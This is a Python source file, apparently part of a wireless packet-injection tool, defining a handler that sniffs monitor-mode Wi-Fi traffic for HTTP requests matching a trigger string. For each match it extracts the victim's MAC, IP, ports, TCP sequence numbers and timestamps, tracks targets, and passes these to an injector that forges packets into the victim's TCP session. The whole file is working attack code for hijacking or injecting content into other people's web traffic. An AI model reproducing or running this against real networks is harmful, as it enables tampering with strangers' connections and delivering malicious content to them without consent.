from lib.injector import Injector
from lib.tracker import Tracker
from scapy.layers.dot11 import RadioTap, Dot11, Dot11QoS
from scapy.layers.l2 import Ether, LLC, SNAP
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.utils import wrpcap
import socket

class Handler(object):
    """Determines if a given packet should be processed further

    Acts as an ETL layer for packet injection decisions
    """

    def __init__(self, **kwargs):
        self.i = kwargs.get('i')
        self.tParams = kwargs.get('tParams')
        args = kwargs.get('Args')
        self.nic = args.mon
        # self.single = args.single
        if args.trigger is None:
            self.trigger = 'GET /'
        else:
            self.trigger = args.trigger

        self.newTgts = []
        self.injector = Injector(self.i, args)


    def proc_handler(self, packet, args):
        """Process handler responsible for the last mile of packet filtering
        Obtains packet specific information and stores it to memory
        """
        if packet.haslayer(IP) and packet.haslayer(TCP):

            ## Trigger check
            request = self.requestExtractor(packet)
            if self.trigger in request:
                tgtMac = packet.getlayer(Dot11).addr2
                rtrmac = packet.getlayer(Dot11).addr1
                tgtIp = packet.getlayer(IP).src
                svrip = packet.getlayer(IP).dst
                tgtPort = packet.getlayer(TCP).sport
                svrport = packet.getlayer(TCP).dport
                size = len(packet.getlayer(TCP).load)
                acknum = str(int(packet.getlayer(TCP).seq) + size)
                seqnum = packet.getlayer(TCP).ack
                # wrpcap('inbound.pcap', packet)
            else:
                return 0

            try:
                TSVal, TSecr = packet.getlayer(TCP).options[2][1]
            except:
                TSVal = None
                TSecr = None

            return (tgtMac,
                    rtrmac,
                    tgtIp,
                    svrip,
                    tgtPort,
                    svrport,
                    acknum,
                    seqnum,
                    request,
                    TSVal,
                    TSecr)
        return None


    def process(self, interface, pkt, args):
        """Process packets coming from the sniffer."""
        try:
            tgtMac, rtrmac, tgtIp, svrip, tgtPort, svrport, acknum, seqnum, request, TSVal, TSecr = self.proc_handler(pkt, args)
            exists = 0
            for tgt in self.newTgts:
                if tgt.ip is not None and tgt.ip == tgtIp:
                    exists = 1

                    for tgt in self.newTgts:
                        if tgt.ip is not None:
                            if tgt.ip == tgtIp:
                                self.injector.inject(tgtMac,
                                                     rtrmac,
                                                     tgtIp,
                                                     svrip,
                                                     tgtPort,
                                                     svrport,
                                                     acknum,
                                                     seqnum,
                                                     tgt.get_injection(),
                                                     TSVal,
                                                     TSecr)

            if exists == 0:
                self.newTgts.append(Tracker(ip = tgtIp,
                                            mac = tgtMac,
                                            tParams = self.tParams))
        except:
            return


    def requestExtractor(self, pkt):
        """Extracts the payload for trigger processing"""
        ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
        if len(ret2.strip()) > 0:
            return ret2.translate(None, "'").strip()
        else:
            return None
